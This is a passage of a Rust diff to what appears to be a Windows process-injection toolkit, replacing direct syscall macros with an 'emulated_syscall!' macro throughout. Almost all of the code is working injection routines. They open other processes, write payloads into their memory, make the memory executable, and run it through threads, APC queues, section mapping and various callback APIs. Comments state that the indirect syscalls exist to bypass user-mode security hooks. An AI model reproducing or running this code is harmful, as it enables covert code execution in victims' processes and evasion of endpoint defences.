         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4774,7 +4774,7 @@ unsafe fn stage_callback_payload(
         | PROCESS_VM_WRITE
         | PROCESS_CREATE_THREAD
         | PROCESS_QUERY_INFORMATION) as u64;
-    let open_status = nt_syscall::syscall!(
+    let open_status = emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         access_mask,
@@ -4792,7 +4792,7 @@ unsafe fn stage_callback_payload(
 
     macro_rules! cleanup_and_err {
         ($msg:expr) => {{
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique,
                 reason: $msg.to_string(),
@@ -4803,7 +4803,7 @@ unsafe fn stage_callback_payload(
     // ── Allocate RW memory for payload ──
     let mut remote_payload: *mut c_void = std::ptr::null_mut();
     let mut payload_size = payload.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc as u64,
         &mut remote_payload as *mut _ as u64,
@@ -4818,7 +4818,7 @@ unsafe fn stage_callback_payload(
 
     // ── Write payload ──
     let mut written = 0usize;
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc as u64,
         remote_payload as u64,
@@ -4834,7 +4834,7 @@ unsafe fn stage_callback_payload(
     let mut old_prot = 0u32;
     let mut prot_base = remote_payload as usize;
     let mut prot_size = payload.len();
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc as u64,
         &mut prot_base as *mut _ as u64,
@@ -4849,7 +4849,7 @@ unsafe fn stage_callback_payload(
     // Allocate RW memory for stub
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
     let mut stub_size = stub.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc as u64,
         &mut remote_stub as *mut _ as u64,
@@ -4864,7 +4864,7 @@ unsafe fn stage_callback_payload(
 
     // Write stub
     let mut written = 0usize;
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc as u64,
         remote_stub as u64,
@@ -4880,7 +4880,7 @@ unsafe fn stage_callback_payload(
     let mut old_prot = 0u32;
     let mut prot_base = remote_stub as usize;
     let mut prot_size = stub.len();
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc as u64,
         &mut prot_base as *mut _ as u64,
@@ -4890,13 +4890,13 @@ unsafe fn stage_callback_payload(
     );
 
     // Flush I-cache for both regions.
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc as u64,
         remote_payload as u64,
         payload.len() as u64,
     );
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc as u64,
         remote_stub as u64,
@@ -5012,7 +5012,7 @@ fn inject_callback_enum_system_locales(
         let mut remote_caller: *mut c_void = std::ptr::null_mut();
         let mut caller_size = caller.len();
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_caller as *mut _ as u64,
@@ -5022,7 +5022,7 @@ fn inject_callback_enum_system_locales(
             PAGE_READWRITE as u64,
         );
         let mut written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_caller as u64,
@@ -5033,7 +5033,7 @@ fn inject_callback_enum_system_locales(
         let mut old_prot = 0u32;
         let mut prot_base = remote_caller as usize;
         let mut prot_size = caller.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -5041,7 +5041,7 @@ fn inject_callback_enum_system_locales(
             PAGE_EXECUTE_READ as u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             remote_caller as u64,
@@ -5050,8 +5050,8 @@ fn inject_callback_enum_system_locales(
 
         // Execute the caller stub via a suspended thread.
         let h_thread = create_suspended_thread(h_proc, remote_caller as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5104,8 +5104,8 @@ fn inject_callback_enum_windows(
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
 
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5171,8 +5171,8 @@ fn inject_callback_enum_child_windows(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5246,8 +5246,8 @@ fn inject_callback_enum_desktop_windows(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5377,8 +5377,8 @@ fn inject_callback_create_timer_queue(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5432,8 +5432,8 @@ fn inject_callback_enum_time_formats(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5500,8 +5500,8 @@ fn inject_callback_enum_resource_types(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5569,7 +5569,7 @@ fn inject_callback_enum_font_families(
         let mut remote_lf: *mut c_void = std::ptr::null_mut();
         let mut lf_size = logfont.len();
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_lf as *mut _ as u64,
@@ -5579,7 +5579,7 @@ fn inject_callback_enum_font_families(
             PAGE_READWRITE as u64,
         );
         let mut written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_lf as u64,
@@ -5620,8 +5620,8 @@ fn inject_callback_enum_font_families(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5681,8 +5681,8 @@ fn inject_callback_cert_enum_system_store(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5739,8 +5739,8 @@ fn inject_callback_sh_enum_unread_mail(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5814,8 +5814,8 @@ fn inject_callback_enumerate_loaded_modules(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5861,7 +5861,7 @@ fn inject_callback_copy_file_ex(
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
         let mut remote_src: *mut c_void = std::ptr::null_mut();
         let mut src_size = src_path.len() * 2;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_src as *mut _ as u64,
@@ -5871,7 +5871,7 @@ fn inject_callback_copy_file_ex(
             PAGE_READWRITE as u64,
         );
         let mut written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_src as u64,
@@ -5882,7 +5882,7 @@ fn inject_callback_copy_file_ex(
 
         let mut remote_dst: *mut c_void = std::ptr::null_mut();
         let mut dst_size = dst_path.len() * 2;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut remote_dst as *mut _ as u64,
@@ -5892,7 +5892,7 @@ fn inject_callback_copy_file_ex(
             PAGE_READWRITE as u64,
         );
         let mut written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             remote_dst as u64,
@@ -5929,7 +5929,7 @@ fn inject_callback_copy_file_ex(
 
         let mut io_status_block: [u64; 2] = [0; 0];
         let mut h_file: usize = 0;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtCreateFile",
             &mut h_file as *mut _ as u64,
             0x40000000u64, // GENERIC_WRITE
@@ -5948,7 +5948,7 @@ fn inject_callback_copy_file_ex(
             // Write a single byte so the file is non-empty.
             let byte = [0x20u8; 1];
             let mut written_local = 0usize;
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtWriteFile",
                 h_file as u64,
                 0u64, // Event
@@ -5960,7 +5960,7 @@ fn inject_callback_copy_file_ex(
                 0u64, // ByteOffset
                 0u64, // Key
             );
-            let _ = nt_syscall::syscall!("NtClose", h_file as u64);
+            let _ = emulated_syscall!("NtClose", h_file as u64);
         }
 
         // Build caller stub:
@@ -6007,8 +6007,8 @@ fn inject_callback_copy_file_ex(
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
         let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -6036,7 +6036,7 @@ unsafe fn write_and_exec_stub(
 
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
     let mut stub_size = stub.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc as u64,
         &mut remote_stub as *mut _ as u64,
@@ -6056,7 +6056,7 @@ unsafe fn write_and_exec_stub(
     }
 
     let mut written = 0usize;
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc as u64,
         remote_stub as u64,
@@ -6068,7 +6068,7 @@ unsafe fn write_and_exec_stub(
     let mut old_prot = 0u32;
     let mut prot_base = remote_stub as usize;
     let mut prot_size = stub.len();
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc as u64,
         &mut prot_base as *mut _ as u64,
@@ -6076,7 +6076,7 @@ unsafe fn write_and_exec_stub(
         PAGE_EXECUTE_READ as u64,
         &mut old_prot as *mut _ as u64,
     );
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc as u64,
         remote_stub as u64,
@@ -6100,7 +6100,7 @@ unsafe fn write_and_exec_stub(
 //   6. Execute via APC / Thread / Callback
 //   7. Cleanup: NtClose section handle
 //
-// All NT API calls go through indirect syscalls via nt_syscall::syscall! macro.
+// All NT API calls go through indirect syscalls via emulated_syscall! macro.
 
 /// Open the target process with the access rights needed for section mapping.
 ///
@@ -6126,7 +6126,7 @@ unsafe fn open_target_for_section_map(
         access_mask |= PROCESS_CREATE_THREAD as u64;
     }
 
-    let open_status = nt_syscall::syscall!(
+    let open_status = emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         access_mask,
@@ -6250,7 +6250,7 @@ unsafe fn find_alertable_thread(
 
                 let mut h_thread: usize = 0;
                 let thread_access = (THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT) as u64;
-                let t_status = nt_syscall::syscall!(
+                let t_status = emulated_syscall!(
                     "NtOpenThread",
                     &mut h_thread as *mut _ as u64,
                     thread_access,
@@ -6326,7 +6326,7 @@ fn inject_section_mapping(
         // SEC_COMMIT = 0x8000000
         // SECTION_ALL_ACCESS = 0x000F001F
         let mut h_section: usize = 0;
-        let create_status = nt_syscall::syscall!(
+        let create_status = emulated_syscall!(
             "NtCreateSection",
             &mut h_section as *mut _ as u64,
             0x000F_001Fu64, // SECTION_ALL_ACCESS
@@ -6365,7 +6365,7 @@ fn inject_section_mapping(
         let mut local_base: *mut c_void = std::ptr::null_mut();
         let mut view_size: usize = 0;
 
-        let map_local_status = nt_syscall::syscall!(
+        let map_local_status = emulated_syscall!(
             "NtMapViewOfSection",
             h_section as u64,
             (-1isize) as u64, // NtCurrentProcess()
@@ -6380,7 +6380,7 @@ fn inject_section_mapping(
         );
 
         if map_local_status.is_err() || map_local_status.unwrap() < 0 || local_base.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+            let _ = emulated_syscall!("NtClose", h_section as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: format!(
@@ -6398,7 +6398,7 @@ fn inject_section_mapping(
         );
 
         // Unmap from our process — the section object retains the data.
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtUnmapViewOfSection",
             (-1isize) as u64, // NtCurrentProcess()
             local_base as u64,
@@ -6411,7 +6411,7 @@ fn inject_section_mapping(
             == SectionExecMethod::Thread;
         let h_proc = open_target_for_section_map(pid, need_thread)
             .map_err(|e| {
-                let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+                let _ = emulated_syscall!("NtClose", h_section as u64);
                 e
             })?;
 
@@ -6429,7 +6429,7 @@ fn inject_section_mapping(
         let mut remote_base: *mut c_void = std::ptr::null_mut();
         let mut remote_view_size: usize = 0;
 
-        let map_target_status = nt_syscall::syscall!(
+        let map_target_status = emulated_syscall!(
             "NtMapViewOfSection",
             h_section as u64,
             h_proc as u64,
@@ -6444,8 +6444,8 @@ fn inject_section_mapping(
         );
 
         if map_target_status.is_err() || map_target_status.unwrap() < 0 || remote_base.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
-            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_section as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: format!(
@@ -6466,7 +6466,7 @@ fn inject_section_mapping(
             let mut prot_size = aligned_size;
             let mut old_prot = 0u32;
 
-            let protect_status = nt_syscall::syscall!(
+            let protect_status = emulated_syscall!(
                 "NtProtectVirtualMemory",
                 h_proc as u64,
                 &mut prot_base as *mut _ as u64,
@@ -6477,13 +6477,13 @@ fn inject_section_mapping(
 
             if protect_status.is_err() || protect_status.unwrap() < 0 {
                 // Cleanup: unmap from target, close handles.
-                let _ = nt_syscall::syscall!(
+                let _ = emulated_syscall!(
                     "NtUnmapViewOfSection",
                     h_proc as u64,
                     remote_base as u64,
                 );
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
-                let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_section as u64);
                 return Err(InjectionError::InjectionFailed {
                     technique: technique.clone(),
                     reason: format!(
@@ -6495,7 +6495,7 @@ fn inject_section_mapping(
         }
 
         // Flush I-cache on the target mapping.
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             remote_base as u64,
@@ -6506,7 +6506,7 @@ fn inject_section_mapping(
         //
         // The section is now mapped into both processes. We can close the
         // handle — the mapping remains valid until NtUnmapViewOfSection.
-        let _ = nt_syscall::syscall!("NtClose", h_section as u64);
+        let _ = emulated_syscall!("NtClose", h_section as u64);
 
         // ── Step 6: Execute ────────────────────────────────────────────
         //
@@ -6526,7 +6526,7 @@ fn inject_section_mapping(
                 // Find an alertable thread in the target process.
                 if let Some((h_thread, _tid)) = find_alertable_thread(h_proc, pid) {
                     // Queue APC: NtQueueApcThread(h_thread, remote_base, 0, 0, 0)
-                    let apc_status = nt_syscall::syscall!(
+                    let apc_status = emulated_syscall!(
                         "NtQueueApcThread",
                         h_thread as u64,
                         remote_base as u64,
@@ -6535,26 +6535,26 @@ fn inject_section_mapping(
                         0u64, // ApcRoutineArgument3
                     );
 
-                    let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                    let _ = emulated_syscall!("NtClose", h_thread as u64);
 
                     if apc_status.is_err() || apc_status.unwrap() < 0 {
                         // APC failed — fall back to thread creation.
                         let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
-                        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+                        let _ = emulated_syscall!("NtClose", h_thread as u64);
                     }
                 } else {
                     // No alertable thread found — fall back to thread creation.
                     let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
-                    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-                    let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                    let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+                    let _ = emulated_syscall!("NtClose", h_thread as u64);
                 }
             }
             SectionExecMethod::Thread => {
                 // Create a suspended thread at the payload entry point.
                 let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
-                let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+                let _ = emulated_syscall!("NtClose", h_thread as u64);
             }
             SectionExecMethod::Callback => {
                 // Use callback injection with the section-mapped payload.
@@ -6588,8 +6588,8 @@ fn inject_section_mapping(
 
                 // Execute caller stub.
                 let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-                let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+                let _ = emulated_syscall!("NtClose", h_thread as u64);
             }
         }
 
@@ -6711,7 +6711,7 @@ unsafe fn write_section_stub(
 
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
     let mut alloc_size = stub.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc as u64,
         &mut remote_stub as *mut _ as u64,
@@ -6732,7 +6732,7 @@ unsafe fn write_section_stub(
     }
 
     let mut written = 0usize;
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc as u64,
         remote_stub as u64,
@@ -6754,7 +6754,7 @@ unsafe fn write_section_stub(
     let mut old_prot = 0u32;
     let mut prot_base = remote_stub as usize;
     let mut prot_size = stub.len();
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc as u64,
         &mut prot_base as *mut _ as u64,
@@ -6762,7 +6762,7 @@ unsafe fn write_section_stub(
         PAGE_EXECUTE_READ as u64,
         &mut old_prot as *mut _ as u64,
     );
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc as u64,
         remote_stub as u64,
@@ -6845,7 +6845,7 @@ const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;
 /// compares. Returns true if the info class works.
 #[cfg(windows)]
 unsafe fn test_ntsetinfo_write_support() -> bool {
-    use nt_syscall::syscall;
+    
 
     // Get current process handle (-1 = NtCurrentProcess)
     let cur_proc: u64 = -1i64 as u64;
@@ -6853,7 +6853,7 @@ unsafe fn test_ntsetinfo_write_support() -> bool {
     // Allocate a small RW buffer in our own process
     let mut base_addr: usize = 0;
     let mut region_size: usize = 0x1000; // one page
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtAllocateVirtualMemory",
         cur_proc,
         &mut base_addr as *mut _ as u64,
@@ -6876,7 +6876,7 @@ unsafe fn test_ntsetinfo_write_support() -> bool {
         bytes_written: 0,
     };
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtSetInformationProcess",
         cur_proc,
         PROCESS_READWRITE_VM as u64,
@@ -6894,7 +6894,7 @@ unsafe fn test_ntsetinfo_write_support() -> bool {
 
     // Clean up: free the allocation
     let mut free_size: usize = 0;
-    let _ = syscall!(
+    let _ = emulated_syscall!(
         "NtFreeVirtualMemory",
         cur_proc,
         &mut base_addr as *mut _ as u64,
@@ -6916,7 +6916,7 @@ unsafe fn ntsetinfo_cross_write(
     target_addr: usize,
     payload: &[u8],
 ) -> Result<(), i32> {
-    use nt_syscall::syscall;
+    
 
     // --- Attempt 1: ProcessReadWriteVm (0x6A) ---
     let mut layout_rw = ProcessReadWriteVmLayout {
@@ -6926,7 +6926,7 @@ unsafe fn ntsetinfo_cross_write(
         bytes_written: 0,
     };
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtSetInformationProcess",
         h_proc,
         PROCESS_READWRITE_VM as u64,
@@ -6955,7 +6955,7 @@ unsafe fn ntsetinfo_cross_write(
         bytes_written: 0,
     };
 
-    let status2 = syscall!(
+    let status2 = emulated_syscall!(
         "NtSetInformationProcess",
         h_proc,
         PROCESS_VM_OPERATION_CLASS as u64,
@@ -6972,7 +6972,7 @@ unsafe fn ntsetinfo_cross_write(
     // either undocumented info class. Still uses indirect syscall to bypass
     // user-mode hooks.
     let mut bytes_written: usize = 0;
-    let status3 = syscall!(
+    let status3 = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc,
         target_addr as u64,
@@ -7003,7 +7003,7 @@ unsafe fn inject_nt_set_info_process(
     pid: u32,
     payload: &[u8],
 ) -> Result<InjectionHandle, InjectionError> {
-    use nt_syscall::syscall;
+    
 
     // ── Step 1: Open target process ─────────────────────────────────────
     //
@@ -7020,7 +7020,7 @@ unsafe fn inject_nt_set_info_process(
     let mut obj_attrs: u64 = 0; // OBJECT_ATTRIBUTES — pass NULL for simple open
     let mut client_id: (u64, u64) = (pid as u64, 0); // (UniqueProcess, UniqueThread)
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64,
@@ -7039,7 +7039,7 @@ unsafe fn inject_nt_set_info_process(
     let mut base_addr: usize = 0;
     let mut region_size: usize = page_align(payload.len() + 0xFFF); // round up to page
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc,
         &mut base_addr as *mut _ as u64,
@@ -7050,7 +7050,7 @@ unsafe fn inject_nt_set_info_process(
     );
 
     if status != 0 || base_addr == 0 {
-        let _ = syscall!("NtClose", h_proc);
+        let _ = emulated_syscall!("NtClose", h_proc);
         return Err(InjectionError::InjectionFailed {
             technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
             reason: format!(
@@ -7070,14 +7070,14 @@ unsafe fn inject_nt_set_info_process(
     if let Err(nt_status) = write_result {
         // Clean up allocation
         let mut free_size: usize = 0;
-        let _ = syscall!(
+        let _ = emulated_syscall!(
             "NtFreeVirtualMemory",
             h_proc,
             &mut base_addr as *mut _ as u64,
             &mut free_size as *mut _ as u64,
             0x8000u64, // MEM_RELEASE
         );
-        let _ = syscall!("NtClose", h_proc);
+        let _ = emulated_syscall!("NtClose", h_proc);
 
         return Err(InjectionError::InjectionFailed {
             technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
@@ -7098,7 +7098,7 @@ unsafe fn inject_nt_set_info_process(
     let mut prot_base = base_addr;
     let mut prot_size = region_size;
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc,
         &mut prot_base as *mut _ as u64,
@@ -7116,7 +7116,7 @@ unsafe fn inject_nt_set_info_process(
     //
     // Ensure the CPU doesn't execute stale cached instructions from the
     // previously mapped RW page.
-    let _ = syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc,
         base_addr as u64,
@@ -7129,7 +7129,7 @@ unsafe fn inject_nt_set_info_process(
     // Using NtCreateThreadEx via indirect syscall to avoid hooks.
     let mut h_thread: u64 = 0;
 
-    let status = syscall!(
+    let status = emulated_syscall!(
         "NtCreateThreadEx",
         &mut h_thread as *mut _ as u64,
         0x1FFFFFu64, // THREAD_ALL_ACCESS
@@ -7147,14 +7147,14 @@ unsafe fn inject_nt_set_info_process(
     if status != 0 || h_thread == 0 {
         // Thread creation failed — clean up
         let mut free_size: usize = 0;
-        let _ = syscall!(
+        let _ = emulated_syscall!(
             "NtFreeVirtualMemory",
             h_proc,
             &mut base_addr as *mut _ as u64,
             &mut free_size as *mut _ as u64,
             0x8000u64,
         );
-        let _ = syscall!("NtClose", h_proc);
+        let _ = emulated_syscall!("NtClose", h_proc);
 
         return Err(InjectionError::InjectionFailed {
             technique: InjectionTechnique::NtSetInfoProcess { target_pid: pid },
@@ -7168,8 +7168,8 @@ unsafe fn inject_nt_set_info_process(
     // ── Step 7: Cleanup ─────────────────────────────────────────────────
     //
     // Close thread and process handles. The injected code continues running.
-    let _ = syscall!("NtClose", h_thread);
-    let _ = syscall!("NtClose", h_proc);
+    let _ = emulated_syscall!("NtClose", h_thread);
+    let _ = emulated_syscall!("NtClose", h_proc);
 
     Ok(InjectionHandle {
         target_pid: pid,
@@ -7314,7 +7314,7 @@ fn inject_fiber(
         // Write stub into target.
